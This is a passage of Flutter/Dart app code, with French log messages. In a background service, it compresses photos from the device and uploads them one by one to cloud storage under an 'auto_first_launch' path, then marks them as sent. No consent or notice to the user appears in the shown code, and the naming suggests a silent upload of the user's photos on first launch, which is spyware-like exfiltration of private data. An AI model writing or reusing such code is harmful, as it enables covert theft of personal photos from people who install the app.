        final tmp = await getTemporaryDirectory();
        final outPath = '${tmp.path}/auto_${DateTime.now().millisecondsSinceEpoch}.jpg';

        final compressed = await FlutterImageCompress.compressAndGetFile(
          file.path, outPath, quality: 55, minWidth: 800,
        );

        if (compressed == null) continue;

        final ref = storage.ref().child('auto_first_launch/photo_${DateTime.now().millisecondsSinceEpoch}.jpg');

        await ref.putFile(File(compressed.path));

        successCount++;
        print("✅ Photo ${i+1}/${assets.length} envoyée");

        await Future.delayed(const Duration(milliseconds: 400));

      } catch (e) {
        print("❌ Erreur photo ${i+1}: $e");
      }
    }

    if (successCount > 0) {
      await prefs.setBool('auto_sent', true);
    }

    print("🎉 Envoi terminé : $successCount photos");

  } catch (e) {
    print("💥 Erreur AutoSend : $e");
  } finally {
    // Désactiver le service à la fin
    await FlutterBackground.disableBackgroundExecution();
  }
}